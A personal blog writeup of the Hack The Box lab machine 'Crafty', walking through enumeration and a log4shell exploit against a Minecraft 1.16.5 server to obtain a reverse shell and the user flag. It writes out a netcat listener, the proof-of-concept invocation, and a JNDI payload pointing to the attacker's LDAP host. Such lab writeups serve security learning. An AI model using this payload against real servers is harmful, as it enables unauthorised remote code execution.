---
title: 'HTB Crafty Writeup'
date: 2024-05-21
permalink: /posts/2024/05/HTB-Crafty-Writeup/
tags:
  - HTB
  - writeup
  - easy
---

A writeup of the Hack The Box machine "Crafty" with easy difficulty

<img src='/images/HTB_Crafty/Screenshot 2024-06-10 232406.png'>

**Hello! Welcome to this writeup of the hack the box windows machine Crafty with easy difficulty.**

Enumeration
======
The first step is scanning the machine IP with nmap to discover what ports and services are running.

<img src='/images/HTB_Crafty/Screenshot 2024-06-10 232601.png'>

We see that port 80 in running a Windows IIS server at the crafty.htb URL.

To access the site, we add the URL and corresponding IP to the hosts list with: `echo "10.10.11.249   crafty.htb" | sudo tee -a /etc/hosts`

<img src='/images/HTB_Crafty/Screenshot 2024-06-10 232749.png'>

Oeh a Minecraft related site!

Navigating the site gives us nothing except the play.crafty.htb address.

We run a dirsearch to enumerate the URLs > 

<img src='/images/HTB_Crafty/Screenshot 2024-06-10 232945.png'>

If we go the the /img directory in the URL we get a 403 - Forbidden: Access is denied.

Let’s add the subdomain play.crafty.htb to the hosts list to see where this is leading.

Alright, this just redirects us back to crafty.htb.

Oh! I just realized that this could be a Minecraft server. These usually run on port 25565. 

Let's run nmap again to discover the ports properly. 

<img src='/images/HTB_Crafty/Screenshot 2024-06-10 233226.png'>

A Minecraft 1.16.5 server. 

User flag
======
Let’s search for vulnerabilities:

I found an article on how to exploit a 1.16.5 server with the well-known log4shell vulnerability: [https://software-sinner.medium.com/exploiting-minecraft-servers-log4j-ddac7de10847](https://software-sinner.medium.com/exploiting-minecraft-servers-log4j-ddac7de10847)

There is a tool for the log4 shell exploit: [https://github.com/kozmer/log4j-shell-poc?tab=readme-ov-file&source=post_page-----b9ff472f9d12--------------------------------](https://github.com/kozmer/log4j-shell-poc?tab=readme-ov-file&source=post_page-----b9ff472f9d12--------------------------------)

After cloning this repo we run the `pip install -r requirements.txt` command. 

After that, let’s see what the poc.py file does. > 

<img src='/images/HTB_Crafty/Screenshot 2024-06-10 233432.png'>

I changed the `String cmd` value to `cmd.exe`, because it is a windows server.

Let’s run the script with a netcat listener to accept reverse shell connection. > `nc -lvnp 4444`

Command > `python3 poc.py --userip localhost --webport 8000 --lport 4444`

Oh, I got an error that I don’t have jdk1.8.0_20/bin/java' installed. So let’s do that via this website > [https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html)

We need to make an account to download the Java SE Development Kit 8u20.

<img src='/images/HTB_Crafty/Screenshot 2024-06-10 234220.png'>

Unzip it with `gzip –d jdk-8u20-linux-i286.tar.gz` and `tar -xf`

The filename has to be changed to jdk1.8.0_20

Then run the script again > 

<img src='/images/HTB_Crafty/Screenshot 2024-06-10 234405.png'>

Now I realized I have to run Minecraft inside my Kali. This can be done with TLauncer.

<img src='/images/HTB_Crafty/Screenshot 2024-06-10 234512.png'>

Then we send this in the chat of the Minecraft server: `${jndi:ldap://10.10.14.33:1389/a}`

And we are in! 

<img src='/images/HTB_Crafty/Screenshot 2024-06-10 234650.png'>

The user flag is in the Desktop directory >

<img src='/images/HTB_Crafty/Screenshot 2024-06-10 234816.png'>

Root flag
======
I could not figure out a way to get admin privileges and found an article on how to get it: [https://medium.com/@jamesjarviscyber/crafty-hackthebox-walkthrough-technical-management-summaries-b9ff472f9d12](https://medium.com/@jamesjarviscyber/crafty-hackthebox-walkthrough-technical-management-summaries-b9ff472f9d12)

To get to the root flag read the writeup :)

Conclusion
======
This machine is marked as easy. I do not agree with that, because it gets complicated with many listeners, finding the exploit that works and finding an entry point. Besides that, it was fun at first due to the fact that the machine is a Minecraft server, but if you get deeper into the machine the fun gets taken away for me sadly. That’s why I didn’t proceed trying to break in myself to gain the root flag.

Have a nice day!